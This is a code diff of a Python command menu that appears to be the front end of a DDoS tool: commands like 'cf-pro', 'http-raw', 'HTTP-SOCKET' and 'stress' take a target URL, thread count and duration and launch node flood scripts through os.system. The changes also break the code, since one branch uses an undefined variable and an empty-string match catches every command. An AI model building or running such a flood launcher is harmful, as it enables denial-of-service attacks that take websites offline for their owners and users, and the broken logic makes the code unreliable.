@@ -83,15 +83,15 @@ def main():
         elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
             ()
 
-        elif "http-socket" in cnc:
+        elif "cf-pro" in cnc:
             try:
                 url = cnc.split()[1]
                 per = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'node HTTP-SOCKET {url} {per} {time}')
+                os.system(f'node cf-pro.py {url} {per} {time}')
             except IndexError:
-                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
-                print(Fore.BLUE +'Example: http-socket http://TranDucDuy.info/ 5000 60')
+                print(Fore.BLUE +'Usage: cf-pro <url> <thread> <time>')
+                print(Fore.BLUE +'Example: cf-pro http://TranDucDuy.info/ 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -102,14 +102,14 @@ def main():
                 print(Fore.BLUE +'Usage: http-raw <url> <time>')
                 print(Fore.BLUE +'Example: http-raw TranDucDuy.info/ 60')
 
-        elif "http-requests" in cnc:
+        elif "HTTP-SOCKET" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-REQUESTS {url} {time}')
+                os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print(Fore.BLUE +'Usage: http-requests <url> <time>')
-                print(Fore.BLUE +'Example: http-requests http://TranDucDuy.info/ 60')
+                print(Fore.BLUE +'Usage: HTTP-SOCKET <url> <per> <time>')
+                print(Fore.BLUE +'Example: HTTP-SOCKET http://example.com 5000 60')
 
         elif "stress" in cnc:
             try:
@@ -136,7 +136,7 @@ def main():
                 print(Fore.BLUE +'Usage: http-rand <url> <time>')
                 print(Fore.BLUE +'Example: http-rand http://TranDucDuy.info/ 60')
 
-        elif "sever" in cnc:
+        elif "" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
